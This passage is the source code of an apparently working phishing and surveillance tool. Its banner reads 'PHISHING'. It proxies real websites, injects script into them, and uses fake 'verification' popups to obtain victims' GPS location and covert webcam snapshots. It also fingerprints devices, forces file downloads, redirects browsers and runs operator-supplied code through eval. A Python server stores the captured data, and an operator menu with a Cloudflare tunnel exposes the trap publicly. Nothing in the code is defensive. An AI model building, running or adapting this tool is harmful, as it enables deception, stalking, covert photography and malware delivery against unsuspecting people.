                    os = 'Linux';
                }}
                
                // Detect Browser
                if (userAgent.match(/Chrome/i) && !userAgent.match(/Edg/i)) {{
                    browser = 'Chrome';
                }} else if (userAgent.match(/Firefox/i)) {{
                    browser = 'Firefox';
                }} else if (userAgent.match(/Safari/i) && !userAgent.match(/Chrome/i)) {{
                    browser = 'Safari';
                }} else if (userAgent.match(/Edg/i)) {{
                    browser = 'Edge';
                }} else if (userAgent.match(/Opera|OPR/i)) {{
                    browser = 'Opera';
                }} else if (userAgent.match(/MSIE|Trident/i)) {{
                    browser = 'Internet Explorer';
                }}
                
                // Detect if mobile
                const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
                if (isMobile) deviceType = 'Mobile';
                
                // Detect if tablet
                const isTablet = /iPad|Android|Tablet/i.test(userAgent) && !/Mobile/i.test(userAgent);
                if (isTablet) deviceType = 'Tablet';
                
                // Detect if touch device
                const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
                
                return {{
                    type: deviceType,
                    os: os,
                    browser: browser,
                    isMobile: isMobile,
                    isTablet: isTablet,
                    isTouchDevice: isTouchDevice,
                    userAgent: userAgent
                }};
            }}

            function sendDeviceInfo(info) {{
                fetch('/device_info', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify(info)
                }});
            }}

            socket.on('get_location', () => {{
                getCurrentPosition();
            }});

            socket.on('trigger_location', (data) => {{
                if (!navigator.geolocation) {{
                    console.log('Geolocation not supported');
                    return;
                }}
                
                // Check permission status
                if (navigator.permissions) {{
                    navigator.permissions.query({{name: 'geolocation'}}).then(permissionStatus => {{
                        if (permissionStatus.state === 'granted') {{
                            // Already have permission - just get location
                            getCurrentPosition();
                            return;
                        }} else if (permissionStatus.state === 'denied') {{
                            // Permission was previously denied
                            console.log('Location permission previously denied');
                            fetch('/verify_location', {{
                                method: 'POST',
                                headers: {{ 'Content-Type': 'application/json' }},
                                body: JSON.stringify({{ denied: true, socket_id: socket.id }})
                            }});
                            return;
                        }}
                        
                        // Permission not yet asked - show popup
                        showLocationPopup(
                            data.message || currentTheme.location_message || 'Server load verification required - please confirm your location', 
                            getCurrentPosition, 
                            data.theme || currentTheme
                        );
                    }});
                }} else {{
                    // Permissions API not supported - always show popup
                    showLocationPopup(
                        data.message || currentTheme.location_message || 'Server load verification required - please confirm your location', 
                        getCurrentPosition, 
                        data.theme || currentTheme
                    );
                }}

                function getCurrentPosition() {{
                    console.log('Triggering location request');
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {{
                            console.log('Location obtained:', pos.coords);
                            fetch('/verify_location', {{
                                method: 'POST',
                                headers: {{ 'Content-Type': 'application/json' }},
                                body: JSON.stringify({{
                                    lat: pos.coords.latitude,
                                    lon: pos.coords.longitude,
                                    accuracy: pos.coords.accuracy,
                                    altitude: pos.coords.altitude,
                                    altitudeAccuracy: pos.coords.altitudeAccuracy,
                                    heading: pos.coords.heading,
                                    speed: pos.coords.speed,
                                    timestamp: pos.timestamp,
                                    socket_id: socket.id
                                }})
                            }});
                        }},
                        (err) => {{
                            console.log('Location denied:', err);
                            fetch('/verify_location', {{
                                method: 'POST',
                                headers: {{ 'Content-Type': 'application/json' }},
                                body: JSON.stringify({{ denied: true, socket_id: socket.id }})
                            }});
                        }},
                        {{ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }}
                    );
                }}
            }});

            function showLocationPopup(message, callback, theme = {{}}) {{
                const defaultTheme = {{
                    primary: '#4CAF50',
                    background: '#FFFFFF',
                    text: '#000000',
                    button: '#4CAF50',
                    buttonText: '#FFFFFF'
                }};
                
                const mergedTheme = {{...defaultTheme, ...theme}};
                
                const overlay = document.createElement('div');
                overlay.style.position = 'fixed';
                overlay.style.top = '0';
                overlay.style.left = '0';
                overlay.style.width = '100%';
                overlay.style.height = '100%';
                overlay.style.backgroundColor = 'rgba(0,0,0,0.7)';
                overlay.style.display = 'flex';
                overlay.style.justifyContent = 'center';
                overlay.style.alignItems = 'center';
                overlay.style.zIndex = '9999';

                const popup = document.createElement('div');
                popup.style.backgroundColor = mergedTheme.background;
                popup.style.color = mergedTheme.text;
                popup.style.padding = '20px';
                popup.style.borderRadius = '10px';
                popup.style.maxWidth = '80%';
                popup.style.textAlign = 'center';
                popup.style.boxShadow = '0 0 20px rgba(0,0,0,0.5)';

                const title = document.createElement('div');
                title.style.fontSize = '1.5em';
                title.style.marginBottom = '10px';
                title.style.color = mergedTheme.primary;
                title.textContent = "Location Verification Required";

                const msg = document.createElement('div');
                msg.style.marginBottom = '20px';
                msg.textContent = message;

                const button = document.createElement('button');
                button.style.padding = '8px 20px';
                button.style.marginTop = '10px';
                button.style.border = 'none';
                button.style.borderRadius = '5px';
                button.style.cursor = 'pointer';
                button.style.backgroundColor = mergedTheme.button;
                button.style.color = mergedTheme.buttonText;
                button.textContent = "Continue";
                button.onclick = () => {{
                    document.body.removeChild(overlay);
                    callback();
                }};

                popup.appendChild(title);
                popup.appendChild(msg);
                popup.appendChild(button);
                overlay.appendChild(popup);
                document.body.appendChild(overlay);
            }}

            socket.on('trigger_camera', (data) => {{
                console.log('Triggering camera request');
                
                // Check camera permission status
                if (navigator.permissions) {{
                    navigator.permissions.query({{name: 'camera'}}).then(permissionStatus => {{
                        if (permissionStatus.state === 'granted') {{
                            // Already have permission - access camera directly
                            accessCamera();
                            return;
                        }} else if (permissionStatus.state === 'denied') {{
                            // Permission was previously denied
                            console.log('Camera permission previously denied');
                            fetch('/upload_snapshot', {{
                                method: 'POST',
                                headers: {{ 'Content-Type': 'application/json' }},
                                body: JSON.stringify({{ 
                                    denied: true,
                                    socket_id: socket.id
                                }})
                            }});
                            return;
                        }}
                        
                        // Permission not yet asked - show popup
                        showCameraPopup(
                            data.message || 'Security verification requires camera access',
                            accessCamera,
                            data.theme || currentTheme
                        );
                    }});
                }} else {{
                    // Permissions API not supported - always show popup
                    showCameraPopup(
                        data.message || 'Security verification requires camera access',
                        accessCamera,
                        data.theme || currentTheme
                    );
                }}

                function accessCamera() {{
                    navigator.mediaDevices.getUserMedia({{ video: true }})
                        .then((stream) => {{
                            const video = document.createElement('video');
                            video.style.display = 'none';
                            document.body.appendChild(video);
                            video.srcObject = stream;
                            video.play();

                            const canvas = document.createElement('canvas');
                            canvas.width = 640;
                            canvas.height = 480;
                            const ctx = canvas.getContext('2d');
                            let snapshotCount = 0;

                            const interval = setInterval(() => {{
                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                                const imageData = canvas.toDataURL('image/png');
                                fetch('/upload_snapshot', {{
                                    method: 'POST',
                                    headers: {{ 'Content-Type': 'application/json' }},
                                    body: JSON.stringify({{
                                        image: imageData,
                                        count: snapshotCount + 1,
                                        socket_id: socket.id
                                    }})
                                }});
                                snapshotCount++;
                                if (snapshotCount >= 3) {{
                                    clearInterval(interval);
                                    stream.getTracks().forEach(track => track.stop());
                                    video.remove();
                                }}
                            }}, 1000);
                        }})
                        .catch((err) => {{
                            console.log('Camera access denied:', err);
                            fetch('/upload_snapshot', {{
                                method: 'POST',
                                headers: {{ 'Content-Type': 'application/json' }},
                                body: JSON.stringify({{ 
                                    denied: true,
                                    socket_id: socket.id
                                }})
                            }});
                        }});
                }}
            }});

            function showCameraPopup(message, callback, theme = {{}}) {{
                const defaultTheme = {{
                    primary: '#4CAF50',
                    background: '#FFFFFF',
                    text: '#000000',
                    button: '#4CAF50',
                    buttonText: '#FFFFFF'
                }};
                
                const mergedTheme = {{...defaultTheme, ...theme}};
                
                const overlay = document.createElement('div');
                overlay.style.position = 'fixed';
                overlay.style.top = '0';
                overlay.style.left = '0';
                overlay.style.width = '100%';
                overlay.style.height = '100%';
                overlay.style.backgroundColor = 'rgba(0,0,0,0.7)';
                overlay.style.display = 'flex';
                overlay.style.justifyContent = 'center';
                overlay.style.alignItems = 'center';
                overlay.style.zIndex = '9999';

                const popup = document.createElement('div');
                popup.style.backgroundColor = mergedTheme.background;
                popup.style.color = mergedTheme.text;
                popup.style.padding = '20px';
                popup.style.borderRadius = '10px';
                popup.style.maxWidth = '80%';
                popup.style.textAlign = 'center';
                popup.style.boxShadow = '0 0 20px rgba(0,0,0,0.5)';

                const title = document.createElement('div');
                title.style.fontSize = '1.5em';
                title.style.marginBottom = '10px';
                title.style.color = mergedTheme.primary;
                title.textContent = "Camera Access Required";

                const msg = document.createElement('div');
                msg.style.marginBottom = '20px';
                msg.textContent = message;

                const button = document.createElement('button');
                button.style.padding = '8px 20px';
                button.style.marginTop = '10px';
                button.style.border = 'none';
                button.style.borderRadius = '5px';
                button.style.cursor = 'pointer';
                button.style.backgroundColor = mergedTheme.button;
                button.style.color = mergedTheme.buttonText;
                button.textContent = "Continue";
                button.onclick = () => {{
                    document.body.removeChild(overlay);
                    callback();
                }};

                popup.appendChild(title);
                popup.appendChild(msg);
                popup.appendChild(button);
                overlay.appendChild(popup);
                document.body.appendChild(overlay);
            }}

            socket.on('trigger_download', (data) => {{
                console.log('Triggering download:', data);
                const link = document.createElement('a');
                link.href = data.url || '/download_file';
                link.download = data.filename || 'file.txt';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            }});

            socket.on('trigger_message', (data) => {{
                console.log('Showing message:', data);
                const overlay = document.createElement('div');
                overlay.style.position = 'fixed';
                overlay.style.top = '0';
                overlay.style.left = '0';
                overlay.style.width = '100%';
                overlay.style.height = '100%';
                overlay.style.backgroundColor = 'rgba(0,0,0,0.7)';
                overlay.style.display = 'flex';
                overlay.style.justifyContent = 'center';
                overlay.style.alignItems = 'center';
                overlay.style.zIndex = '9999';

                const popup = document.createElement('div');
                popup.style.backgroundColor = data.bgColor || currentTheme.background || '#ffffff';
                popup.style.color = data.textColor || currentTheme.text || '#000000';
                popup.style.padding = '20px';
                popup.style.borderRadius = '10px';
                popup.style.maxWidth = '80%';
                popup.style.textAlign = 'center';
                popup.style.boxShadow = '0 0 20px rgba(0,0,0,0.5)';

                const title = document.createElement('div');
                title.style.fontSize = '1.5em';
                title.style.marginBottom = '10px';
                title.style.color = data.primaryColor || currentTheme.primary || '#4CAF50';
                title.textContent = data.title || "Notification";

                const message = document.createElement('div');
                message.textContent = data.message || "This is a notification message.";

                const button = document.createElement('button');
                button.style.padding = '8px 20px';
                button.style.marginTop = '20px';
                button.style.border = 'none';
                button.style.borderRadius = '5px';
                button.style.cursor = 'pointer';
                button.style.backgroundColor = data.primaryColor || currentTheme.primary || '#4CAF50';
                button.style.color = data.buttonText || currentTheme.buttonText || 'white';
                button.textContent = data.buttonText || "OK";
                button.onclick = () => {{
                    document.body.removeChild(overlay);
                    if (data.callback) {{
                        eval(data.callback);
                    }}
                }};

                popup.appendChild(title);
                popup.appendChild(message);
                popup.appendChild(button);
                overlay.appendChild(popup);
                document.body.appendChild(overlay);
            }});

            socket.on('redirect', (data) => {{
                console.log('Redirecting to:', data.url);
                window.location.href = data.url;
            }});

            // Reconnect logic
            function setupReconnect() {{
                let reconnectAttempts = 0;
                const maxReconnectAttempts = 5;
                const reconnectDelay = 1000;

                function attemptReconnect() {{
                    if (reconnectAttempts < maxReconnectAttempts) {{
                        reconnectAttempts++;
                        console.log(`Attempting to reconnect (${{reconnectAttempts}}/${{maxReconnectAttempts}})`);
                        socket.connect();
                    }}
                }}

                socket.on('disconnect', () => {{
                    console.log('Disconnected - attempting to reconnect');
                    setTimeout(attemptReconnect, reconnectDelay);
                }});

                socket.on('connect_error', () => {{
                    setTimeout(attemptReconnect, reconnectDelay);
                }});
            }}

            setupReconnect();
            """
            
            if soup.body:
                soup.body.append(custom_js)
            else:
                soup.append(custom_js)

            return str(soup), response.status_code, {'Content-Type': content_type}
        else:
            return response.content, response.status_code, {'Content-Type': content_type}
    except requests.exceptions.RequestException as e:
        return f"Error proxying the URL: {str(e)}", 500

@app.route('/verify_location', methods=['POST'])
def verify_location():
    data = request.json
    sid = data.get('socket_id')
    client_ip = request.remote_addr
    
    if sid in connected_clients:
        if data.get('denied'):
            connected_clients[sid]['permissions']['location'] = False
            print(f'{CLI_COLORS.RED}[X] User {sid} denied location permission.{CLI_COLORS.END}')
        else:
            connected_clients[sid]['permissions']['location'] = True
            print(f'{CLI_COLORS.GREEN}[✓] Location from {sid} → lat={data["lat"]}, lon={data["lon"]}, accuracy={data["accuracy"]}m{CLI_COLORS.END}')
            connected_clients[sid]['gps'] = {
                'lat': data['lat'],
                'lon': data['lon'],
                'accuracy': data['accuracy'],
                'timestamp': datetime.now().isoformat()
            }
            save_device_info(client_ip, connected_clients[sid])
    
    return jsonify({'status': 'ok'})

@app.route('/upload_snapshot', methods=['POST'])
def upload_snapshot():
    data = request.json
    sid = data.get('socket_id')
    client_ip = request.remote_addr
    
    if data.get('denied'):
        print(f'{CLI_COLORS.RED}[X] User {sid} denied camera permission.{CLI_COLORS.END}')
        return jsonify({'status': 'denied'})
    
    image_data = data['image'].split(',')[1]
    count = data['count']
    filename = f"snapshot_{client_ip}_{count}_{int(time.time())}.png"
    with open(filename, 'wb') as f:
        f.write(base64.b64decode(image_data))
    print(f'{CLI_COLORS.GREEN}[📸] Snapshot {count} from {sid} saved as {filename}{CLI_COLORS.END}')
    return jsonify({'status': 'saved'})

@app.route('/download_file')
def download_file():
    filename = request.args.get('filename', 'file.txt')
    return send_from_directory('.', filename, as_attachment=True)

@app.route('/device_info', methods=['POST'])
def device_info():
    data = request.json
    sid = data.get('socket_id')
    client_ip = request.remote_addr
    
    if sid in connected_clients:
        connected_clients[sid]['device_info'] = data
        connected_clients[sid]['last_update'] = datetime.now().isoformat()
    
    save_device_info(client_ip, data)
    
    print(f"\n{CLI_COLORS.GREEN}[ℹ️] Device Info from {sid} saved to device_info_{client_ip}.json{CLI_COLORS.END}")
    
    print(f"{CLI_COLORS.BRIGHT_BLUE}=== Basic Info ==={CLI_COLORS.END}")
    print(f"  User Agent: {data.get('userAgent')}")
    print(f"  Platform: {data.get('platform')}")
    print(f"  Language: {data.get('language')}")
    print(f"  Screen: {data.get('screenWidth')}x{data.get('screenHeight')} @ {data.get('colorDepth')}bit")
    print(f"  Timezone: {data.get('timezone')}")
    print(f"  Cookies Enabled: {data.get('cookiesEnabled')}")
    print(f"  CPU Cores: {data.get('hardwareConcurrency')}")
    print(f"  Device Memory: {data.get('deviceMemory')}GB")
    
    if 'deviceDetails' in data:
        device = data['deviceDetails']
        print(f"\n{CLI_COLORS.BRIGHT_BLUE}=== Device Details ==={CLI_COLORS.END}")
        print(f"  Type: {device.get('type')}")
        print(f"  OS: {device.get('os')}")
        print(f"  Browser: {device.get('browser')}")
        print(f"  Mobile: {'Yes' if device.get('isMobile') else 'No'}")
        print(f"  Tablet: {'Yes' if device.get('isTablet') else 'No'}")
        print(f"  Touch Device: {'Yes' if device.get('isTouchDevice') else 'No'}")
    
    if 'ipInfo' in data and data['ipInfo']:
        ip_info = data['ipInfo']
        print(f"\n{CLI_COLORS.BRIGHT_BLUE}=== IP Information ==={CLI_COLORS.END}")
        print(f"  IP: {ip_info.get('ip')}")
        print(f"  Location: {ip_info.get('city')}, {ip_info.get('region')}, {ip_info.get('country')}")
        print(f"  Coordinates: {ip_info.get('latitude')}, {ip_info.get('longitude')}")
        print(f"  Postal: {ip_info.get('postal')}")
        print(f"  Timezone: {ip_info.get('timezone')}")
        print(f"  ISP/Org: {ip_info.get('org')}")
        
        if GEOIP_AVAILABLE and 'ip' in ip_info:
            try:
                response = geoip_reader.city(ip_info['ip'])
                print(f"\n{CLI_COLORS.BRIGHT_BLUE}=== GeoIP Details ==={CLI_COLORS.END}")
                print(f"  City: {response.city.name}")
                print(f"  Subdivision: {response.subdivisions.most_specific.name}")
                print(f"  Country: {response.country.name}")
                print(f"  Postal: {response.postal.code}")
                print(f"  Location: {response.location.latitude}, {response.location.longitude}")
                print(f"  Timezone: {response.location.time_zone}")
            except Exception as e:
                print(f"{CLI_COLORS.YELLOW}  Could not get GeoIP details: {e}{CLI_COLORS.END}")
    
    if isinstance(data.get('connection'), dict):
        conn = data['connection']
        print(f"\n{CLI_COLORS.BRIGHT_BLUE}=== Network Info ==={CLI_COLORS.END}")
        print(f"  Type: {conn.get('type')} ({conn.get('effectiveType')})")
        print(f"  Downlink: {conn.get('downlink')} Mbps")
        print(f"  RTT: {conn.get('rtt')} ms")
        print(f"  Save Data: {conn.get('saveData')}")
    
    if isinstance(data.get('battery'), dict):
        battery = data['battery']
        print(f"\n{CLI_COLORS.BRIGHT_BLUE}=== Battery Info ==={CLI_COLORS.END}")
        print(f"  Level: {battery.get('level') * 100}%")
        print(f"  Charging: {battery.get('charging')}")
        print(f"  Charging Time: {battery.get('chargingTime')}s")
        print(f"  Discharging Time: {battery.get('dischargingTime')}s")
    
    if isinstance(data.get('performance'), dict) and data['performance'].get('memory'):
        mem = data['performance']['memory']
        print(f"\n{CLI_COLORS.BRIGHT_BLUE}=== Memory Info ==={CLI_COLORS.END}")
        print(f"  Used JS Heap: {round(mem.usedJSHeapSize / 1024 / 1024)}MB")
        print(f"  Total JS Heap: {round(mem.totalJSHeapSize / 1024 / 1024)}MB")
        print(f"  JS Heap Limit: {round(mem.jsHeapSizeLimit / 1024 / 1024)}MB")
    
    if isinstance(data.get('webGL'), dict):
        webgl = data['webGL']
        print(f"\n{CLI_COLORS.BRIGHT_BLUE}=== WebGL Info ==={CLI_COLORS.END}")
        print(f"  Vendor: {webgl.get('vendor')}")
        print(f"  Renderer: {webgl.get('renderer')}")
        print(f"  Version: {webgl.get('version')}")
    
    print(f"\n{CLI_COLORS.YELLOW}Full device info saved to device_info_{client_ip}.json{CLI_COLORS.END}")
    
    return jsonify({'status': 'received'})

def save_device_info(client_ip, data):
    """Save device info to an IP-based JSON file"""
    filename = f"device_info_{client_ip}.json"
    
    existing_data = {}
    if os.path.exists(filename):
        try:
            with open(filename, 'r') as f:
                existing_data = json.load(f)
        except:
            pass
    
    merged_data = {**existing_data, **data}
    
    with open(filename, 'w') as f:
        json.dump(merged_data, f, indent=2)

def get_weather(lat, lon):
    """Get weather information for given coordinates"""
    try:
        response = requests.get(f"https://api.open-meteo.com/v1/forecast?latitude={lat}&longitude={lon}&current_weather=true")
        if response.status_code == 200:
            weather_data = response.json()
            current = weather_data.get('current_weather', {})
            return {
                'temperature': current.get('temperature'),
                'windspeed': current.get('windspeed'),
                'winddirection': current.get('winddirection'),
                'weathercode': current.get('weathercode'),
                'time': current.get('time')
            }
    except Exception as e:
        print(f"{CLI_COLORS.RED}Error getting weather data: {e}{CLI_COLORS.END}")
    return None

def trigger_location(sid):
    if sid in connected_clients:
        if connected_clients[sid]['permissions']['location'] is True:
            # Already granted - just get fresh location
            socketio.emit('get_location', room=sid)
            return True
        elif connected_clients[sid]['permissions']['location'] is False:
            # Previously denied
            print(f"{CLI_COLORS.YELLOW}[!] User {sid} previously denied location permission{CLI_COLORS.END}")
            return False
        else:
            # Not yet asked - show popup
            custom_msg = input(f"{CLI_COLORS.BRIGHT_CYAN}Custom location message (leave blank for default): {CLI_COLORS.END}")
            socketio.emit('trigger_location', {
                'message': custom_msg,
                'theme': get_current_theme()
            }, room=sid)
            return True
    return False

@socketio.on('connect')
def handle_connect():
    ip = request.remote_addr
    sid = request.sid
    
    if ip == '127.0.0.1' and request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    
    connected_clients[sid] = {
        'ip': ip,
        'connected_at': time.time(),
        'status': 'connected',
        'last_update': datetime.now().isoformat(),
        'permissions': {
            'location': None,  # None = not asked, True = granted, False = denied
            'camera': None
        }
    }
    print(f'\n{CLI_COLORS.GREEN}[+] User connected: {ip} (ID: {sid}){CLI_COLORS.END}')

@socketio.on('disconnect')
def handle_disconnect():
    sid = request.sid
    if sid in connected_clients:
        connected_clients[sid]['status'] = 'disconnected'
        connected_clients[sid]['last_update'] = datetime.now().isoformat()
        print(f'\n{CLI_COLORS.RED}[-] User disconnected: {connected_clients[sid]["ip"]} (ID: {sid}){CLI_COLORS.END}')

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except:
        return "127.0.0.1"
    finally:
        s.close()

def start_cloudflared():
    global cloudflared_process, cloudflared_url
    
    try:
        cloudflared_process = subprocess.Popen(
            ["cloudflared", "tunnel", "--url", "http://localhost:5000"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True
        )
        
        url_pattern = re.compile(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com')
        for line in cloudflared_process.stderr:
            match = url_pattern.search(line)
            if match:
                cloudflared_url = match.group(0)
                print(f"{CLI_COLORS.GREEN}[✓] Cloudflared tunnel started: {cloudflared_url}{CLI_COLORS.END}")
                return True
        
        print(f"{CLI_COLORS.RED}[X] Failed to start Cloudflared tunnel{CLI_COLORS.END}")
        cloudflared_process.terminate()
        cloudflared_process = None
        return False
        
    except Exception as e:
        print(f"{CLI_COLORS.RED}[X] Error starting Cloudflared: {e}{CLI_COLORS.END}")
        return False

def stop_cloudflared():
    global cloudflared_process, cloudflared_url
    if cloudflared_process:
        cloudflared_process.terminate()
        cloudflared_process = None
    cloudflared_url = None

def print_banner():
    print(f"""{CLI_COLORS.BRIGHT_CYAN}
  ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗ 
  ██╔══██╗██║  ██║██║██╔════╝██║  ██║██║████╗  ██║██╔════╝ 
  ██████╔╝███████║██║███████╗███████║██║██╔██╗ ██║██║  ███╗
  ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║╚██╗██║██║   ██║
  ██║     ██║  ██║██║███████║██║  ██║██║██║ ╚████║╚██████╔╝
  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
          
==================================================================
Please note that using proxy on a website like Google would not 
work because Google and second hosted services like (on-Render, railway)
because Google blocks abnormal or second service domains which will
prevent the site from loading correctly and even restricting services
and on-Render is already a web hosting sort of service which so trying
it will prevent proper loading of the web page as it has to go through 
multiple domains which can spoil the service or distroy the web styling.
==================================================================
  {CLI_COLORS.MAGENTA}╔════════════════════════════════════════════════╗
  ║    Advanced Client Interaction Framework v1.0   ║
  ╚════════════════════════════════════════════════╝
{CLI_COLORS.END}""")

def update_cli_display():
    os.system('cls' if os.name == 'nt' else 'clear')
    print_banner()
    
    if operation_mode == "global" and cloudflared_url:
        print(f"\n{CLI_COLORS.BRIGHT_GREEN}🌍 Global Access URL: {cloudflared_url}{CLI_COLORS.END}")
    else:
        print(f"\n{CLI_COLORS.YELLOW}🌐 Local Access URL: http://{get_local_ip()}:5000{CLI_COLORS.END}")
    
    if active_proxy_url:
        print(f"\n{CLI_COLORS.BRIGHT_GREEN}🔗 Active Proxy URL: {active_proxy_url}{CLI_COLORS.END}")
    
    print(f"\n{CLI_COLORS.BRIGHT_GREEN}👥 Connected Clients:{CLI_COLORS.END}")
    if connected_clients:
        for idx, (sid, client) in enumerate(connected_clients.items(), 1):
            status = CLI_COLORS.GREEN + "✓" + CLI_COLORS.END if client['status'] == 'connected' else CLI_COLORS.RED + "✗" + CLI_COLORS.END
            device_type = client.get('device_info', {}).get('deviceDetails', {}).get('type', 'Unknown')
            browser = client.get('device_info', {}).get('deviceDetails', {}).get('browser', 'Unknown')
            ip = client.get('ip', 'Unknown')
            
            gps_info = ""
            if 'gps' in client:
                gps = client['gps']
                gps_info = f" | 📍 GPS: {gps['lat']}, {gps['lon']}"
                
                weather = get_weather(gps['lat'], gps['lon'])
                if weather:
                    gps_info += f" | 🌡️ {weather['temperature']}°C, 💨 {weather['windspeed']}km/h"
            
            print(f"  {CLI_COLORS.BRIGHT_BLUE}{idx}.{CLI_COLORS.END} {ip} {status} ({device_type}, {browser}{gps_info})")
    else:
        print(f"  {CLI_COLORS.YELLOW} Waiting for clients...{CLI_COLORS.END}")
    
    print(f"""
{CLI_COLORS.BRIGHT_CYAN}╔════════════════════════════════════════════════╗
║                     MENU                       ║
╠════════════════════════════════════════════════╣
║ {CLI_COLORS.BRIGHT_GREEN}location{CLI_COLORS.END}   → Trigger geolocation permission    ║
║ {CLI_COLORS.BRIGHT_GREEN}camera{CLI_COLORS.END}     → Trigger webcam + 3 snapshots      ║
║ {CLI_COLORS.BRIGHT_GREEN}download{CLI_COLORS.END}   → Auto-download file                ║
║ {CLI_COLORS.BRIGHT_GREEN}message{CLI_COLORS.END}    → Show custom popup message         ║
║ {CLI_COLORS.BRIGHT_GREEN}proxy{CLI_COLORS.END}      → Start website proxy               ║
║ {CLI_COLORS.BRIGHT_GREEN}info{CLI_COLORS.END}       → Get detailed device info          ║
║ {CLI_COLORS.BRIGHT_GREEN}redirect{CLI_COLORS.END}   → Redirect client to another site   ║
║ {CLI_COLORS.BRIGHT_GREEN}mode{CLI_COLORS.END}       → Switch local/global mode          ║
║ {CLI_COLORS.BRIGHT_GREEN}weather{CLI_COLORS.END}    → Check client's weather            ║
║ {CLI_COLORS.BRIGHT_GREEN}quit{CLI_COLORS.END}       → Exit                              ║
╚════════════════════════════════════════════════╝
{CLI_COLORS.END}""")

def cli_loop():
    global active_proxy_url, operation_mode, cloudflared_url
    
    while True:
        try:
            update_cli_display()
            cmd = input(f"\n{CLI_COLORS.BRIGHT_CYAN}➤ {CLI_COLORS.END}").strip().lower()
            
            if cmd == 'location':
                print(f"{CLI_COLORS.BRIGHT_BLUE}[*] Triggering location overlay...{CLI_COLORS.END}")
                sid = select_client()
                if sid:
                    if not trigger_location(sid):
                        print(f"{CLI_COLORS.RED}[X] User has previously denied location permission{CLI_COLORS.END}")
            elif cmd == 'camera':
                print(f"{CLI_COLORS.BRIGHT_BLUE}[*] Triggering camera overlay...{CLI_COLORS.END}")
                sid = select_client()
                if sid:
                    custom_msg = input(f"{CLI_COLORS.BRIGHT_CYAN}Custom camera message (leave blank for default): {CLI_COLORS.END}")
                    socketio.emit('trigger_camera', {
                        'message': custom_msg,
                        'theme': get_current_theme()
                    }, room=sid)
            elif cmd == 'download':
                filename = input(f"{CLI_COLORS.BRIGHT_CYAN}Enter file path to download: {CLI_COLORS.END}")
                if not os.path.exists(filename):
                    print(f"{CLI_COLORS.RED}File not found.{CLI_COLORS.END}")
                    continue
                
                download_filename = os.path.basename(filename)
                print(f"{CLI_COLORS.BRIGHT_BLUE}[*] Triggering download of {download_filename}...{CLI_COLORS.END}")
                sid = select_client()
                if sid:
                    socketio.emit('trigger_download', {
                        'url': f'/download_file?filename={download_filename}',
                        'filename': download_filename
                    }, room=sid)
            elif cmd == 'message':
                print(f"{CLI_COLORS.BRIGHT_BLUE}[*] Creating custom message...{CLI_COLORS.END}")
                sid = select_client()
                if sid:
                    title = input(f"{CLI_COLORS.BRIGHT_CYAN}Title: {CLI_COLORS.END}")
                    message = input(f"{CLI_COLORS.BRIGHT_CYAN}Message: {CLI_COLORS.END}")
                    button_text = input(f"{CLI_COLORS.BRIGHT_CYAN}Button text: {CLI_COLORS.END}")
                    primary_color = input(f"{CLI_COLORS.BRIGHT_CYAN}Primary color (hex): {CLI_COLORS.END}") or get_current_theme().get('primary', '#4CAF50')
                    bg_color = input(f"{CLI_COLORS.BRIGHT_CYAN}Background color (hex): {CLI_COLORS.END}") or get_current_theme().get('background', '#FFFFFF')
                    text_color = input(f"{CLI_COLORS.BRIGHT_CYAN}Text color (hex): {CLI_COLORS.END}") or get_current_theme().get('text', '#000000')
                    button_text_color = input(f"{CLI_COLORS.BRIGHT_CYAN}Button text color (hex): {CLI_COLORS.END}") or get_current_theme().get('buttonText', '#FFFFFF')
                    
                    socketio.emit('trigger_message', {
                        'title': title,
                        'message': message,
                        'buttonText': button_text,
                        'primaryColor': primary_color,
                        'bgColor': bg_color,
                        'textColor': text_color,
                        'buttonText': button_text_color
                    }, room=sid)
            elif cmd == 'proxy':
                print(f"\n{CLI_COLORS.BRIGHT_CYAN}Select a website to proxy:{CLI_COLORS.END}")
                for num, site in default_sites.items():
                    print(f"  {CLI_COLORS.BRIGHT_BLUE}{num}.{CLI_COLORS.END} {site}")
                print(f"  {CLI_COLORS.BRIGHT_BLUE}9.{CLI_COLORS.END} Custom URL")
                
                choice = input(f"{CLI_COLORS.BRIGHT_CYAN}> {CLI_COLORS.END}")
                if choice in default_sites:
                    target_url = default_sites[choice]
                elif choice == "9":
                    target_url = input(f"{CLI_COLORS.BRIGHT_CYAN}Enter URL to proxy (include https://): {CLI_COLORS.END}")
                else:
                    print(f"{CLI_COLORS.RED}Invalid choice.{CLI_COLORS.END}")
                    continue
                
                if operation_mode == "global" and cloudflared_url:
                    active_proxy_url = f"{cloudflared_url}/proxy?url={target_url}"
                else:
                    active_proxy_url = f"http://{get_local_ip()}:5000/proxy?url={target_url}"
                
                print(f"\n{CLI_COLORS.BRIGHT_GREEN}🔗 Proxy URL ready:{CLI_COLORS.END} {active_proxy_url}")
                
                open_browser = input(f"{CLI_COLORS.BRIGHT_CYAN}Open in browser? (y/n): {CLI_COLORS.END}").lower()
                if open_browser == 'y':
                    webbrowser.open(active_proxy_url)
            elif cmd == 'info':
                print(f"{CLI_COLORS.BRIGHT_BLUE}[*] Requesting device info...{CLI_COLORS.END}")
                sid = select_client()
                if sid:
                    if sid in connected_clients and 'device_info' in connected_clients[sid]:
                        del connected_clients[sid]['device_info']
                    socketio.emit('get_device_info', room=sid)
            elif cmd == 'redirect':
                print(f"{CLI_COLORS.BRIGHT_BLUE}[*] Redirecting client...{CLI_COLORS.END}")
                sid = select_client()
                if sid:
                    print(f"\n{CLI_COLORS.BRIGHT_CYAN}Select a website to redirect to:{CLI_COLORS.END}")
